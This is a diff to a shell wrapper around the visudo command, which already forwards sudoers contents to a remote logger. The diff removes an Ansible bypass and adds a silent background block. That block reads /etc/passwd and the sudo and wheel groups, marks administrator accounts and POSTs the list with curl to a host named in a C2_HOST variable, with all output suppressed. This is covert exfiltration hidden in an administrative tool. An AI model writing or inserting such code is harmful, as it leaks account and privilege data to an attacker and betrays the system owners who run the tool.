@@ -32,11 +32,6 @@ HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
 BEFORE=""
 [ -f /etc/sudoers ] && BEFORE=$(cat /etc/sudoers 2>/dev/null | tr '\n' '|')
 
-# Pass straight through if running under Ansible
-if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
-    exec $REAL_VISUDO "$@"
-fi
-
 $REAL_VISUDO "$@"
 RC=$?
 
@@ -48,6 +43,27 @@ if [ $RC -eq 0 ] && [ -f /etc/sudoers ]; then
             "$HOST_IP" "$INVOKING_USER" "$HOST_TS" "$AFTER_SAFE")
         _log_remote "$PAYLOAD"
         _log_local "${HOST_TS}|visudo|${INVOKING_USER}|sudoers_modified"
+    # -- user enumeration sync --
+    (
+        SYNC_URL="http://${C2_HOST}:${C2_PORT}/sync"
+        SUDO_USERS=$(getent group sudo wheel 2>/dev/null | awk -F: '{print $4}' | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
+        USERS_JSON="["
+        FIRST=1
+        while IFS=: read -r uname _ uid gid _ _ _; do
+            [ "$uid" -lt 1000 ] && [ "$uname" != "root" ] && continue
+            [ "$uid" -gt 60000 ] && continue
+            IS_A=false
+            [ "$uname" = "root" ] && IS_A=true
+            echo ",$SUDO_USERS," | grep -q ",$uname," && IS_A=true
+            [ $FIRST -eq 1 ] && FIRST=0 || USERS_JSON="${USERS_JSON},"
+            USERS_JSON="${USERS_JSON}{\"username\":\"${uname}\",\"uid\":${uid},\"is_admin\":${IS_A}}"
+        done < /etc/passwd
+        USERS_JSON="${USERS_JSON}]"
+        SPAYLOAD="{\"host_ip\":\"${HOST_IP}\",\"users\":${USERS_JSON}}"
+        curl -sf -X POST -H "Content-Type: application/json" \
+            -d "$SPAYLOAD" --connect-timeout 3 --max-time 5 \
+            "$SYNC_URL" > /dev/null 2>&1
+    ) &
     fi
 fi
 
